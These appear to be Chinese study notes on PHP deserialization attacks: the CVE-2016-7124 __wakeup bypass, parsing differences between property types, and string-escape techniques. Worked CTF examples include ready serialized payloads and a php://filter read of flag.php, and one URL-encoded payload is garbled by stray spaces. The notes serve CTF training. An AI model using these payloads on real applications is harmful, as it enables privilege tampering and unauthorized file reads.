# 知识点
## 前置知识点



Web攻防-PHP反序列化&魔术方法&触发条件&POP链构造&变量属性修改&黑白盒角度

- 常见魔术方法
- 常见跳板
- POP链构造

Web攻防-PHP反序列化&原生内置&Exception类&SoapClient类&SimpleXMLElement

- PHP原生反序列化

## 本章知识点
1、WEB攻防-PHP反序列化-CVE&wakeup绕过
2、WEB攻防-PHP反序列化-版本属性解析差异
3、WEB攻防-PHP反序列化-字符增多减少逃逸


# PHP版本绕过漏洞
## CVE-2016-7124（`__wakeup` 绕过）
漏洞编号：CVE-2016-7124
### 影响版本：PHP 5<5.6.25; PHP 7<7.0.10
漏洞危害：如存在__wakeup 方法，调用 unserilize () 方法前则先调用__wakeup 方法，但序列化字符串中表示对象变量属性个数的值**大于**真实变量属性个数时会*跳过__wakeup* 执行
Demo：见 CVE. PHP 与版本切换演示


## 案例： **极客大挑战 2019**PHP
1、下载源码分析，触发 flag 条件
2、分析会触发调用__wakeup 强制 username 值
3、利用语言漏洞绕过 CVE-2016-7124
4、构造 payload 后修改满足漏洞条件触发
**Payload：**
```json
Select=O%3 A 4%3 A%22 Name%22%3 A 3%3 A%7 Bs%3 A 14%3 A%22%00 Name%00 username%22%3 Bs%3 A 5%3 A%22 admin%22%3 Bs%3 A 14%3 A%22%00 Name%00 password%22%3 Bs%3 A 3%3 A%22100%22%3 B%7 D
```

# PHP版本绕过机制
## 变量属性不同序列化数据差异
*对象变量属性：*
public(公共的):在本类内部、外部类、子类都可以访问
protect(受保护的):只有本类或子类或父类中可以访问
private(私人的):只有本类内部可以使用

*序列化数据显示：*
public属性序列化的时候格式是正常成员名
private属性序列化的时候格式是<font color="#c0504d">%00类名%00成员名</font>
protect属性序列化的时候格式是<font color="#c0504d">%00*%00成员名</font> 

## 反序列化变量属性解析不敏感漏洞
正常不同对象变量属性序列化之后会数据会存在差异；以区分变量属性，但是7.1版本以上的PHP；即使反序列化输入的数据是不带变量属性类型的格式，也能成功反序列化输出！
可以利用这个机制，操控私有和保护属性的数据！
### 影响版本：PHP 7.1+
```php
<?php
class Test
{
    public $sex = "man";
    private $name = "xiaodi";
    protected $age = "33";
}
$t=new Test();
print_r(serialize($t));
```

PHP版本导致的属性不同反序列化解析差异

```php
<?php
class test{
    protected $a;
    private $b;
    public function __construct(){
        $this->a = 'abc';
    }
    public function __destruct(){
        echo $this->a;
    }
}

echo serialize(new test());
unserialize('O:4:"test":1:{s:1:"a";s:3:"abc";}');
```
##  案例：**网鼎杯 2020 青龙组 AreUSerialz**
1、destruct ()--> process ()-->read ()
2、绕过 is_valid () 函数，private 和 protected 属性经过序列化都存在不可打印字符在 32-125 之外
```php
public $op=2;
public $filename="php://filter/read=convert.base64-encode/resource=flag.php";
public $content;
```

# PHP字符增多减少逃逸
## 1、字符变多
str 1 .php str 1-pop .php
运算思路：字符个数多了 1 个
后续有 47 个就写 47 个覆盖后续
字符增多操控前面变量

过滤：admin(5)——>hacker(6);增加1位
需要释放的内容：
47位

```json
";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}
```

username控制为:47* 5+47==282位
47个admin和需要释放的内容(47个字符)

adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}


过滤前:
```json
O:4:"user":3:{s:8:"username";s:282:"adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:8:"password";s:6:"xiaodi";s:5:"isVIP";i:0;}
```


过滤后:
原username的282位全部被过滤后hacker占据，所有在原username里面admin后面的内容，被释放出来
```json
O:4:"user":3:{s:8:"username";s:282:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:8:"password";s:6:"xiaodi";s:5:"isVIP";i:0;}
```

## 2、字符变少
str 2 .php str 2-pop.php
运算思路：字符个数少了 1 个（5 位变 4 位）
思考写多个就截取后续多少个，如 23 个等

字符减少，操控后面的变量

过滤 admin(5) -> hack(4) 减少1位

过滤前:
```json
O:4:"user":3:{s:8:"username";s:115:"adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:47:"";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:5:"isVIP";i:0;}
```

过滤后:
```json
O:4:"user":3:{s:8:"username";s:115:"hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:47:"";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:5:"isVIP";i:0;}
```

过滤前(23个admin;125位)
usname=adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin


password=";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}

过滤后
username=hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:47:"

password=123456

挤占内容(23位):
```json
";s:8:"password";s:47:"
```

释放内容：
```json
s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}
```
## 案例：CTFSHOW-Web 262（逃逸解法）
解题思路：提示有 message.php
其中获取 msg 获取 f, m, t 要求 token=admin
字符增多通过本地序列化发现 62 位需要覆盖